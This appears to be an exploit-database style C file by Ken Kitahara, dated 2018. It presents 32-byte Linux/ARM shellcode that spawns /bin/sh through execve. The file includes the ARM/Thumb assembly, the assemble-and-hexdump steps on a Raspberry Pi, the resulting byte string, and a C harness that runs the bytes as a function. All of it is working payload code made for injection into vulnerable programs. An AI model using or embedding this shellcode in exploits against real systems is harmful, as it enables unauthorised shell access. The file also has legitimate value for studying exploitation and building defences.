/*
Title:  Linux/ARM - execve("/bin/sh", ["/bin/sh"], NULL) Shellcode (32 Bytes)
Date:   2018-08-16
Tested: armv7l (Raspberry Pi 3 Model B+)
Author: Ken Kitahara

pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $ cat binsh.s
.section .text
.global _start

_start:
    .ARM
    add  r3, pc, #1
    bx   r3

    .THUMB
    // execve("/bin/sh", ["/bin/sh"], NULL)
    adr  r0, spawn
    eor  r2, r2, r2
    strb r2, [r0, #7]
    push {r0, r2}
    mov  r1, sp
    mov  r7, #11
    svc  #1

    // adjust address
    eor  r7, r7, r7

spawn:
.ascii "/bin/shA"

pi@raspberrypi:~ $ as -o binsh.o binsh.s && ld -N -o binsh binsh.o
pi@raspberrypi:~ $ objcopy -O binary binsh binsh.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' binsh.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x7f\x40\x2f\x62\x69\x6e\x2f\x73\x68\x41

*/

#include<stdio.h>
#include<string.h>

unsigned char sc[] = \
"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
"\x03\xa0\x52\x40\xc2\x71\x05\xb4"
"\x69\x46\x0b\x27\x01\xdf\x7f\x40"
"\x2f\x62\x69\x6e\x2f\x73\x68\x41";

void main()
{
    printf("Shellcode Length: %d\n", strlen(sc));

    int (*ret)() = (int(*)())sc;

    ret();
}